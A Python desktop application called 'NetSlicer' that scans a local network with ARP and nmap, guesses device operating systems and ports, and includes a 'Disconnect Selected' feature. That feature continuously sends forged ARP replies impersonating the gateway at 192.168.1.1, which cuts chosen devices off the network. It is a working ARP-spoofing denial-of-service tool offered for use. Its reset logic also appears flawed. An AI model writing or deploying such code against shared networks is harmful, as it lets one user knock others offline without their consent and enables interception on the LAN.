import scapy.all as scapy
import wx
import time
import threading
import os
import sys
from scapy.layers.http import HTTP
from scapy.layers import http

# Add after the initial imports, before any other code
ICON_PATH = None  # Initialize as None

# Add after imports
def check_dependencies():
    """Check and handle required dependencies"""
    try:
        # Check if running from frozen executable
        if getattr(sys, 'frozen', False):
            application_path = os.path.dirname(sys.executable)
        else:
            application_path = os.path.dirname(os.path.abspath(__file__))

        # Set icon path for frozen and non-frozen versions
        global ICON_PATH
        if getattr(sys, 'frozen', False):
            ICON_PATH = os.path.join(application_path, 'knives.ico')
        else:
            ICON_PATH = os.path.join(application_path, 'app', 'knives.ico')

        return True
    except Exception as e:
        print(f"Error checking dependencies: {e}")
        return False

# Global variable for nmap availability
global NMAP_AVAILABLE
NMAP_AVAILABLE = False

# Try to import nmap, fallback to basic scanning if not available
try:
    import nmap
    NMAP_AVAILABLE = True
except ImportError:
    print("python-nmap not found. Installing basic scanning capabilities only.")

# Variabel global untuk menghentikan pengiriman paket
stop_spoofing = False
spoof_thread = None  # Menyimpan referensi ke thread spoofing

def log_activity(message):
    # Update to use status bar instead of log box
    if hasattr(wx.GetApp(), 'frame'):
        wx.GetApp().frame.status_bar.SetStatusText(message)

def spoof(target_ip, target_mac):
    while not stop_spoofing:
        # Mengirimkan paket ARP spoofing
        scapy.send(scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc="192.168.1.1"), verbose=False)
        time.sleep(1)  # Tunggu 1 detik antara pengiriman

class NetworkScanner:
    def __init__(self):
        self.devices = {}
        self.monitoring = False
        self.packet_counter = 0
        self.last_scan_time = None
        self.nm = None
        self.last_ip_range = None  # Store IP range for monitoring
        
        global NMAP_AVAILABLE
        if NMAP_AVAILABLE:
            try:
                self.nm = nmap.PortScanner()
            except Exception as e:
                print(f"Error initializing nmap: {e}")
                NMAP_AVAILABLE = False

    def advanced_scan(self, ip_range):
        self.last_ip_range = ip_range  # Store IP range for monitoring
        try:
            global NMAP_AVAILABLE
            if NMAP_AVAILABLE and self.nm:
                return self._nmap_scan(ip_range)
            else:
                return self._basic_scan(ip_range)
        except Exception as e:
            return f"Scan error: {str(e)}"

    def _nmap_scan(self, ip_range):
        devices = []
        try:
            # Use more comprehensive nmap scan arguments
            scan_result = self.nm.scan(hosts=ip_range, arguments='-sn -PR -PS22,80,443 -PA21,23,80,3389 -n')
            
            for host in scan_result['scan']:
                if scan_result['scan'][host].get('status', {}).get('state') == 'up':
                    device_info = {
                        'ip': host,
                        'mac': scan_result['scan'][host].get('addresses', {}).get('mac', 'Unknown'),
                        'hostname': scan_result['scan'][host].get('hostnames', [{'name': 'Unknown'}])[0]['name'],
                        'os': 'Unknown',
                        'status': 'active'
                    }
                    self.devices[host] = device_info
                    devices.append(device_info)
                    log_activity(f"Found device: {host}")
        except Exception as e:
            log_activity(f"Nmap scan error: {str(e)}")
            return self._basic_scan(ip_range)  # Fallback to basic scan
            
        return devices

    def _basic_scan(self, ip_range):
        devices = []
        try:
            # Create and send ARP requests
            arp_request = scapy.ARP(pdst=ip_range)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            
            # Increase timeout and retry count for better discovery
            for _ in range(2):  # Try scanning twice
                answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False, retry=2)[0]
                
                for element in answered_list:
                    ip = element[1].psrc
                    mac = element[1].hwsrc
                    
                    # Check if device already found
                    if ip not in [d['ip'] for d in devices]:
                        device_info = {
                            'ip': ip,
                            'mac': mac,
                            'hostname': 'Unknown',
                            'os': 'Unknown',
                            'status': 'active'
                        }
                        self.devices[ip] = device_info
                        devices.append(device_info)
                        log_activity(f"Found device: {ip} ({mac})")
                
                time.sleep(1)  # Short delay between scans
            
            if not devices:
                log_activity("No devices found. Try adjusting the IP range.")
                
        except Exception as e:
            log_activity(f"Basic scan error: {str(e)}")
            
        return devices

    def _get_network_interfaces(self):
        """Get list of available network interfaces"""
        interfaces = []
        try:
            for iface in scapy.get_if_list():
                if iface != 'lo':  # Skip loopback
                    interfaces.append(iface)
            return interfaces
        except Exception as e:
            log_activity(f"Error getting interfaces: {str(e)}")
            return []

    def start_monitoring(self, callback):
        self.monitoring = True
        threading.Thread(target=self._monitor_network, args=(callback,), daemon=True).start()

    def stop_monitoring(self):
        self.monitoring = False

    def _monitor_network(self, callback):
        while self.monitoring:
            try:
                # Use ARP scanning for monitoring instead of packet sniffing
                current_devices = self._basic_scan(self.last_ip_range)
                for device in current_devices:
                    ip = device['ip']
                    if ip not in self.devices:
                        callback(f"New device detected: {ip}")
                        self.devices[ip] = device
                    else:
                        self.devices[ip]['last_seen'] = time.time()
                        self.devices[ip]['status'] = 'active'
                
                # Check for disappeared devices
                current_time = time.time()
                for ip in list(self.devices.keys()):
                    if current_time - self.devices[ip].get('last_seen', 0) > 10:  # 10 seconds timeout
                        callback(f"Device lost: {ip}")
                        self.devices[ip]['status'] = 'inactive'
                
                time.sleep(5)  # Scan every 5 seconds
            except Exception as e:
                callback(f"Monitoring error: {str(e)}")

    def _packet_callback(self, packet, callback):
        if packet.haslayer(scapy.IP):
            src_ip = packet[scapy.IP].src
            dst_ip = packet[scapy.IP].dst
            protocol = packet[scapy.IP].proto
            
            # Update device status and traffic info
            for ip in [src_ip, dst_ip]:
                if ip in self.devices:
                    self.devices[ip]['last_seen'] = time.time()
                    self.devices[ip]['status'] = 'active'
            
            # Analyze packet for security threats
            self._analyze_packet(packet, callback)

    def _analyze_packet(self, packet, callback):
        # Check for potential security threats
        if packet.haslayer(HTTP):
            if packet.haslayer(http.HTTPRequest):
                url = packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
                callback(f"HTTP Request: {url}")

        # Check for unusual port activity
        if packet.haslayer(scapy.TCP):
            port = packet[scapy.TCP].dport
            if port in [22, 23, 3389]:  # Common attack ports
                callback(f"Warning: Activity detected on sensitive port {port}")

    def detect_os(self, ip, mac):
        """Deteksi OS dengan metode yang lebih canggih"""
        os_info = "Unknown"
        try:
            # Coba deteksi OS menggunakan nmap jika tersedia
            if NMAP_AVAILABLE and self.nm:
                scan_result = self.nm.scan(ip, arguments="-O --osscan-guess")
                if 'osmatch' in scan_result['scan'][ip]:
                    matches = scan_result['scan'][ip]['osmatch']
                    if matches:
                        os_info = matches[0]['name']
                        return os_info

            # Jika nmap tidak tersedia, gunakan metode TTL
            ttl_response = scapy.sr1(scapy.IP(dst=ip)/scapy.ICMP(), timeout=1, verbose=False)
            if ttl_response:
                ttl = ttl_response.ttl
                if ttl <= 64:
                    os_info = "Linux/Unix"
                elif ttl <= 128:
                    os_info = "Windows"
                elif ttl <= 255:
                    os_info = "Cisco/Network Device"

            # Tambahan: Deteksi berdasarkan port yang terbuka
            common_ports = [22, 23, 80, 443, 3389]
            open_ports = []
            for port in common_ports:
                response = scapy.sr1(
                    scapy.IP(dst=ip)/scapy.TCP(dport=port, flags="S"),
                    timeout=1,
                    verbose=False
                )
                if response and response.haslayer(scapy.TCP):
                    if response[scapy.TCP].flags == 0x12:  # SYN-ACK
                        open_ports.append(port)

            # Analisis port untuk menentukan OS
            if 3389 in open_ports:
                os_info = "Windows (RDP detected)"
            elif 22 in open_ports and os_info == "Linux/Unix":
                os_info = "Linux/Unix (SSH detected)"

            # Tambahan: Deteksi vendor dari MAC address
            vendor = self._get_mac_vendor(mac)
            if vendor:
                if "Apple" in vendor:
                    os_info = "macOS/iOS"
                elif "Microsoft" in vendor:
                    os_info = "Windows"
                elif "Android" in vendor:
                    os_info = "Android"

            return os_info

        except Exception as e:
            log_activity(f"OS detection error: {str(e)}")
            return "Unknown"

    def _get_mac_vendor(self, mac):
        """Mendapatkan vendor dari MAC address"""
        try:
            # Gunakan 6 karakter pertama MAC address
            mac_prefix = mac.replace(":", "")[:6].upper()
            # Idealnya gunakan database MAC vendor atau API
            # Ini adalah contoh sederhana
            vendors = {
                "00:0C:29": "VMware",
                "00:50:56": "VMware",
                "00:05:69": "VMware",
                "00:1A:11": "Google",
                "00:16:3E": "Xen",
                "52:54:00": "QEMU",
                # Tambahkan lebih banyak vendor sesuai kebutuhan
            }
            return vendors.get(mac_prefix, None)
        except:
            return None

class MyApp(wx.App):
    def OnInit(self):
        # Call check_dependencies before creating the frame
        check_dependencies()
        self.frame = MyFrame()
        self.frame.Show()
        return True

# Modify MyFrame.__init__ to use ICON_PATH
class MyFrame(wx.Frame):
    def __init__(self):
        super().__init__(parent=None, title='NetSlicer')
        
        # Initialize NetworkScanner at the beginning
        self.network_scanner = NetworkScanner()
        
        # Set application icon
        if os.path.exists(ICON_PATH):
            self.SetIcon(wx.Icon(ICON_PATH))

        # Define theme colors
        self.light_theme = {
            'bg': wx.Colour(240, 240, 240),
            'button': wx.Colour(225, 225, 225),
            'text': wx.Colour(0, 0, 0),
            'list_bg': wx.Colour(255, 255, 255),
            'list_fg': wx.Colour(0, 0, 0),
            'highlight': wx.Colour(0, 120, 215)
        }
        
        self.dark_theme = {
            'bg': wx.Colour(45, 45, 45),
            'button': wx.Colour(60, 60, 60),
            'text': wx.Colour(230, 230, 230),
            'list_bg': wx.Colour(30, 30, 30),
            'list_fg': wx.Colour(220, 220, 220),
            'highlight': wx.Colour(0, 160, 255)
        }
        
        # Initialize theme
        self.is_dark_theme = False
        self.current_theme = self.light_theme  # Set default theme
        
        # Set application icon using ICO file instead of PNG
        icon_path = os.path.join(os.path.dirname(__file__), 'knives.ico')
        if os.path.exists(icon_path):
            self.SetIcon(wx.Icon(icon_path))
        
        self.SetSize(800, 700)  # Increased window size
        
        # Create main panel with gradient background
        self.panel = wx.Panel(self)
        self.panel.Bind(wx.EVT_PAINT, self.on_paint)
        
        # Create status bar with two sections
        self.status_bar = self.CreateStatusBar(2)
        self.status_bar.SetStatusWidths([-3, -1])  # 75% for status, 25% for copyright
        
        # Set copyright text in status bar
        self.status_bar.SetStatusText("© Ruhiyatna Rahman 2025", 1)  # 1 is the second section
        self.status_bar.SetStatusText("Ready", 0)  # 0 is the first section

        # Main layout
        main_sizer = wx.BoxSizer(wx.HORIZONTAL)
        
        # Left panel for device list
        left_panel = wx.Panel(self.panel)
        left_sizer = wx.BoxSizer(wx.VERTICAL)
        
        # List control setup
        self.listbox = wx.ListCtrl(left_panel, style=wx.LC_REPORT)
        self.listbox.InsertColumn(0, "IP Address", width=120)
        self.listbox.InsertColumn(1, "MAC Address", width=120)
        self.listbox.InsertColumn(2, "Hostname", width=120)
        self.listbox.InsertColumn(3, "OS", width=100)
        self.listbox.InsertColumn(4, "Status", width=80)
        self.listbox.Bind(wx.EVT_LIST_ITEM_SELECTED, self.on_item_selected)
        left_sizer.Add(self.listbox, 1, wx.EXPAND | wx.ALL, 5)
        left_panel.SetSizer(left_sizer)
        
        # Right panel setup
        right_panel = wx.Panel(self.panel)
        right_sizer = wx.BoxSizer(wx.VERTICAL)

        # Network Control Center group
        scan_group = wx.StaticBox(right_panel, label="Network Control Center")
        scan_sizer = wx.StaticBoxSizer(scan_group, wx.VERTICAL)
        
        # IP range controls
        ip_control_sizer = wx.BoxSizer(wx.HORIZONTAL)
        self.ip_range_label = self._create_label(scan_group, 'IP Range:')
        self.ip_range_entry = wx.TextCtrl(scan_group)
        self.ip_range_entry.SetValue("192.168.1.1/24")
        ip_control_sizer.Add(self.ip_range_label, 0, wx.CENTER | wx.ALL, 5)
        ip_control_sizer.Add(self.ip_range_entry, 1, wx.EXPAND | wx.ALL, 5)
        scan_sizer.Add(ip_control_sizer, 0, wx.EXPAND | wx.ALL, 5)

        # Scan controls
        button_sizer = wx.BoxSizer(wx.HORIZONTAL)
        self.scan_button = self._create_button(scan_group, 'Start Scan', self.on_scan)
        self.monitor_button = self._create_button(scan_group, 'Monitor', self.on_toggle_monitoring)
        button_sizer.Add(self.scan_button, 1, wx.EXPAND | wx.ALL, 2)
        button_sizer.Add(self.monitor_button, 1, wx.EXPAND | wx.ALL, 2)
        scan_sizer.Add(button_sizer, 0, wx.EXPAND | wx.ALL, 5)

        # Advanced options
        adv_sizer = wx.BoxSizer(wx.HORIZONTAL)
        self.port_scan_check = wx.CheckBox(scan_group, label="Port Scan")
        self.os_detect_check = wx.CheckBox(scan_group, label="OS Detect")
        adv_sizer.Add(self.port_scan_check, 1, wx.EXPAND | wx.ALL, 2)
        adv_sizer.Add(self.os_detect_check, 1, wx.EXPAND | wx.ALL, 2)
        scan_sizer.Add(adv_sizer, 0, wx.EXPAND | wx.ALL, 5)

        # Progress bar
        self.status_gauge = wx.Gauge(scan_group, range=100)
        scan_sizer.Add(self.status_gauge, 0, wx.EXPAND | wx.ALL, 5)
        right_sizer.Add(scan_sizer, 0, wx.EXPAND | wx.ALL, 5)

        # Actions group
        action_group = wx.StaticBox(right_panel, label="Actions")
        action_sizer = wx.StaticBoxSizer(action_group, wx.VERTICAL)
        
        action_buttons = [
            ('Disconnect Selected', self.on_disconnect),
            ('Sort IPs', self.on_sort_ips),
            ('Theme', self.toggle_theme),
            ('Help', self.on_help)
        ]
        
        for label, handler in action_buttons:
            btn = self._create_button(action_group, label, handler)
            action_sizer.Add(btn, 0, wx.EXPAND | wx.ALL, 5)
        
        right_sizer.Add(action_sizer, 0, wx.EXPAND | wx.ALL, 5)

        # Disconnected devices list
        self.disconnected_listbox = wx.ListBox(right_panel, size=(300, 150))
        right_sizer.Add(self.disconnected_listbox, 0, wx.EXPAND | wx.ALL, 5)

        # Reset buttons
        self.reset_selected_button = self._create_button(right_panel, 'Reset Selected', self.on_reset_selected)
        self.reset_all_button = self._create_button(right_panel, 'Reset All', self.on_reset_all)
        right_sizer.Add(self.reset_selected_button, 0, wx.EXPAND | wx.ALL, 5)
        right_sizer.Add(self.reset_all_button, 0, wx.EXPAND | wx.ALL, 5)

        right_panel.SetSizer(right_sizer)

        # Add panels to main sizer
        main_sizer.Add(left_panel, 1, wx.EXPAND | wx.ALL, 5)
        main_sizer.Add(right_panel, 0, wx.EXPAND | wx.ALL, 5)
        
        self.panel.SetSizer(main_sizer)
        
        # Important: Layout everything
        self.panel.Layout()
        main_sizer.Fit(self)
        
        # Apply theme after layout
        self.apply_theme()

        # Apply initial theme
        self.apply_theme()

        self.Bind(wx.EVT_CLOSE, self.on_close)

    def _create_button(self, parent, label, handler):
        btn = wx.Button(parent, label=label)
        btn.Bind(wx.EVT_BUTTON, handler)
        btn.SetToolTip(wx.ToolTip(f"Click to {label.lower()}"))
        return btn

    def _create_label(self, parent, text):
        label = wx.StaticText(parent, label=text)
        return label

    def apply_theme(self):
        theme = self.current_theme
        self.panel.SetBackgroundColour(theme['bg'])
        self.listbox.SetBackgroundColour(theme['list_bg'])
        self.listbox.SetForegroundColour(theme['list_fg'])
        
        # Update all buttons
        for child in self.panel.GetChildren():
            if isinstance(child, wx.Button):
                child.SetBackgroundColour(theme['button'])
                child.SetForegroundColour(theme['text'])
        
        self.Refresh()

    def on_paint(self, event):
        dc = wx.PaintDC(self.panel)
        gc = wx.GraphicsContext.Create(dc)
        if gc:
            width, height = self.panel.GetSize()
            theme = self.current_theme
            
            if self.is_dark_theme:
                start_color = wx.Colour(30, 30, 30)
                end_color = wx.Colour(45, 45, 45)
            else:
                start_color = wx.Colour(240, 240, 240)
                end_color = wx.Colour(220, 220, 220)
            
            brush = gc.CreateLinearGradientBrush(0, 0, width, height, start_color, end_color)
            gc.SetBrush(brush)
            gc.DrawRectangle(0, 0, width, height)

    def on_item_selected(self, event):
        self.status_bar.SetStatusText(f"Selected device: {event.GetText()}")

    def toggle_theme(self, event):
        if self.is_dark_theme:
            self.current_theme = self.light_theme
            self.is_dark_theme = False
        else:
            self.current_theme = self.dark_theme
            self.is_dark_theme = True
        self.apply_theme()

    def on_scan(self, event):
        if self.scan_button.GetLabel() == 'Start Scan':
            ip_range = self.ip_range_entry.GetValue()
            if not self._validate_ip_range(ip_range):
                wx.MessageBox("Invalid IP range format!\nUse format: 192.168.1.1/24", "Error")
                return
            
            # Reset gauge before starting new scan
            self.status_gauge.SetValue(0)    
            self.status_gauge.Pulse()
            self.scan_button.SetLabel('Stop')
            self.status_bar.SetStatusText(f"Scanning network: {ip_range}...")
            
            def scan_thread():
                try:
                    scan_args = {
                        'port_scan': self.port_scan_check.GetValue(),
                        'os_detect': self.os_detect_check.GetValue()
                    }
                    devices = self.network_scanner.advanced_scan(ip_range)
                    if isinstance(devices, list):
                        wx.CallAfter(self.display_result, devices)
                        wx.CallAfter(log_activity, f"Scan complete. Found {len(devices)} devices.")
                        if len(devices) == 0:
                            wx.CallAfter(self.status_bar.SetStatusText, "No devices found. Check IP range.")
                    else:
                        wx.CallAfter(log_activity, f"Scan failed: {devices}")
                except Exception as e:
                    wx.CallAfter(log_activity, f"Scan error: {str(e)}")
                finally:
                    wx.CallAfter(self.status_gauge.SetValue, 100)
                    wx.CallAfter(self.scan_button.SetLabel, 'Start Scan')
            
            threading.Thread(target=scan_thread).start()
        else:
            self.scan_button.SetLabel('Start Scan')
            self.status_gauge.SetValue(0)
            self.status_bar.SetStatusText("Scan cancelled")

    def display_result(self, devices):
        """Display scan results in the listbox"""
        self.listbox.DeleteAllItems()
        self.original_devices = devices  # Store for filtering
        
        for device in devices:
            index = self.listbox.GetItemCount()
            self.listbox.InsertItem(index, device.get('ip', 'Unknown'))
            self.listbox.SetItem(index, 1, device.get('mac', 'Unknown'))
            self.listbox.SetItem(index, 2, device.get('hostname', 'Unknown'))
            self.listbox.SetItem(index, 3, device.get('os', 'Unknown'))
            self.listbox.SetItem(index, 4, device.get('status', 'Unknown'))

    def on_disconnect(self, event):
        selected_device = self.listbox.GetFirstSelected()
        if (selected_device != -1):
            ip = self.listbox.GetItemText(selected_device)
            disconnect_device(ip)
            self.disconnected_listbox.Append(f"Disconnected: {ip}")  # Menambahkan ke daftar perangkat yang diputus
        else:
            wx.MessageBox("Please select a device to disconnect.", "Warning")

    def on_reset_selected(self, event):
        selected_device = self.disconnected_listbox.GetSelection()
        if selected_device != wx.NOT_FOUND:
            ip = self.disconnected_listbox.GetString(selected_device).split(": ")[1]
            reset_device(ip)
            self.disconnected_listbox.Delete(selected_device)
        else:
            wx.MessageBox("Please select a device to reset.", "Warning")

    def on_reset_all(self, event):
        """Reset all disconnected devices"""
        if self.disconnected_listbox.IsEmpty():
            wx.MessageBox("No devices to reset", "Info")
            return
        
        dlg = wx.MessageDialog(None, 
                             "Are you sure you want to reset all disconnected devices?",
                             "Confirm Reset All",
                             wx.YES_NO | wx.ICON_QUESTION)
        
        if dlg.ShowModal() == wx.ID_YES:
            self.status_gauge.Pulse()
            self.status_bar.SetStatusText("Resetting all devices...")
            
            def reset_thread():
                try:
                    devices = [self.disconnected_listbox.GetString(i).split(": ")[1] 
                             for i in range(self.disconnected_listbox.GetCount())]
                    
                    total = len(devices)
                    for i, ip in enumerate(devices):
                        wx.CallAfter(self.status_bar.SetStatusText, f"Resetting device {i+1}/{total}: {ip}")
                        reset_device(ip)
                        # Convert float to integer for gauge
                        progress = int((i + 1) * 100 / total)
                        wx.CallAfter(self.status_gauge.SetValue, progress)
                        time.sleep(0.5)
                    
                    wx.CallAfter(self.disconnected_listbox.Clear)
                    wx.CallAfter(self.status_bar.SetStatusText, "All devices have been reset")
                except Exception as e:
                    wx.CallAfter(self.status_bar.SetStatusText, f"Reset error: {str(e)}")
                finally:
                    wx.CallAfter(self.status_gauge.SetValue, 0)
            
            threading.Thread(target=reset_thread, daemon=True).start()
        dlg.Destroy()

    def on_sort_ips(self, event):
        """Sort IP addresses in the listbox"""
        ip_list = [self.listbox.GetItemText(i) for i in range(self.listbox.GetItemCount())]
        ip_list.sort(key=lambda ip: list(map(int, ip.split('.'))))
        
        self.listbox.DeleteAllItems()
        for ip in ip_list:
            # Find original device info
            device = next((d for d in self.original_devices if d['ip'] == ip), None)
            if device:
                index = self.listbox.GetItemCount()
                self.listbox.InsertItem(index, device.get('ip', 'Unknown'))
                self.listbox.SetItem(index, 1, device.get('mac', 'Unknown'))
                self.listbox.SetItem(index, 2, device.get('hostname', 'Unknown'))
                self.listbox.SetItem(index, 3, device.get('os', 'Unknown'))
                self.listbox.SetItem(index, 4, device.get('status', 'Unknown'))

    def on_help(self, event):
        help_text = """
NetSlicer Usage Guide:

Scanning:
- Enter IP range (e.g. 192.168.1.1/24)
- Enable Port Scan/OS Detection if needed
- Click 'Start Scan' to begin scanning
- Monitor progress in status bar

Monitoring:
- Click 'Monitor' to start real-time monitoring
- Devices status will update automatically
- 'Active' = currently connected
- 'Inactive' = no longer responding

Actions:
- Disconnect Selected: Cut device from network
- Sort IPs: Organize device list by IP
- Theme: Toggle dark/light mode
- Reset Selected: Restore connection
- Reset All: Restore all connections

Advanced Features:
- Port Scan: Detect open ports
- OS Detection: Identify operating systems
- Status monitoring: Track device availability
- Real-time updates: Monitor network changes

Tips:
- Use monitoring for continuous network watching
- Check status bar for operation feedback
- Red status indicates potential issues
- Green status indicates normal operation
"""
        dlg = wx.MessageDialog(self, help_text, "NetSlicer Help",
                             wx.OK | wx.ICON_INFORMATION)
        dlg.ShowModal()
        dlg.Destroy()

    def on_close(self, event):
        global stop_spoofing
        stop_spoofing = True  # Menghentikan semua spoofing saat aplikasi ditutup
        self.Destroy()

    def on_toggle_monitoring(self, event):
        if not self.network_scanner.monitoring:
            if not hasattr(self.network_scanner, 'last_ip_range'):
                wx.MessageBox("Please perform a scan first!", "Warning")
                return
            self.network_scanner.monitoring = True
            self.monitor_button.SetLabel("Stop Monitoring")
            self.status_bar.SetStatusText("Monitoring active - Watching for network changes...")
            self.monitor_button.SetBackgroundColour(wx.Colour(200, 255, 200))
            
            def monitor_thread():
                self.network_scanner._monitor_network(self.log_monitoring_event)
            
            threading.Thread(target=monitor_thread, daemon=True).start()
        else:
            self.network_scanner.monitoring = False
            self.monitor_button.SetLabel("Start Monitoring")
            self.status_bar.SetStatusText("Monitoring stopped")
            self.monitor_button.SetBackgroundColour(self.current_theme['button'])

    def log_monitoring_event(self, message):
        wx.CallAfter(self.status_bar.SetStatusText, message)
        wx.CallAfter(self.update_device_status)

    def update_device_status(self):
        """Update device status in the listbox with color indication"""
        for i in range(self.listbox.GetItemCount()):
            ip = self.listbox.GetItem(i, 0).GetText()
            if ip in self.network_scanner.devices:
                status = self.network_scanner.devices[ip]['status']
                self.listbox.SetItem(i, 4, status)
                # Add color indication
                if status == 'active':
                    self.listbox.SetItemBackgroundColour(i, wx.Colour(200, 255, 200))
                elif status == 'inactive':
                    self.listbox.SetItemBackgroundColour(i, wx.Colour(255, 200, 200))

    def _validate_ip_range(self, ip_range):
        """Validate IP range format"""
        import re
        pattern = r'^(\d{1,3}\.){3}\d{1,3}/\d{1,2}$'
        return bool(re.match(pattern, ip_range))

def scan(ip):
    # Enhanced scan function with additional features
    devices = []
    try:
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=3, verbose=False)[0]
        
        for element in answered_list:
            device_info = {
                'ip': element[1].psrc,
                'mac': element[1].hwsrc,
                'vendor': get_vendor_name(element[1].hwsrc),  # New function needed
                'response_time': element[1].time
            }
            devices.append(device_info)
    except Exception as e:
        log_activity(f"Scan error: {str(e)}")
    return devices

def get_vendor_name(mac):
    # Implement MAC vendor lookup using a database or API
    # This is a placeholder function
    return "Unknown Vendor"

def disconnect_device(ip):
    global stop_spoofing, spoof_thread
    target_mac = get_mac(ip)
    if target_mac:
        stop_spoofing = False
        # Memulai thread untuk mengirimkan paket ARP spoofing
        spoof_thread = threading.Thread(target=spoof, args=(ip, target_mac))
        spoof_thread.start()
        log_activity(f"Started disconnecting: {ip}")
    else:
        log_activity("Device not found.")

def reset_device(ip):
    global stop_spoofing
    target_mac = get_mac(ip)
    if target_mac:
        stop_spoofing = True  # Menghentikan pengiriman paket
        time.sleep(1)  # Tunggu sebentar untuk memastikan pengiriman paket dihentikan
        # Mengembalikan perangkat ke keadaan normal
        scapy.send(scapy.ARP(op=2, pdst=ip, hwdst=target_mac, psrc="192.168.1.1"), count=5, verbose=False)
        log_activity(f"Reset device: {ip}")
    else:
        log_activity("Device not found.")

def get_mac(ip):
    for _ in range(3):  # Mencoba 3 kali untuk mendapatkan MAC
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]  # Meningkatkan waktu tunggu
        
        if answered_list:
            for element in answered_list:
                log_activity(f"Found MAC for {ip}: {element[1].hwsrc}")  # Log MAC yang ditemukan
                return element[1].hwsrc
        time.sleep(1)  # Tunggu sebelum mencoba lagi
    log_activity(f"MAC not found for {ip}")  # Log jika MAC tidak ditemukan
    return None

def reset_all():
    """Enhanced reset_all function"""
    global stop_spoofing
    stop_spoofing = True
    
    try:
        # Send ARP packets to restore all connections
        for ip in NetworkScanner.devices.keys():
            mac = get_mac(ip)
            if mac:
                # Send multiple packets to ensure delivery
                scapy.send(
                    scapy.ARP(
                        op=2,
                        pdst=ip,
                        hwdst=mac,
                        psrc="192.168.1.1",
                        hwsrc=scapy.get_if_hwaddr(scapy.conf.iface)
                    ),
                    count=3,
                    verbose=False
                )
    except Exception as e:
        log_activity(f"Reset all error: {str(e)}")
    finally:
        time.sleep(1)

if __name__ == '__main__':
    app = MyApp()
    app.MainLoop()
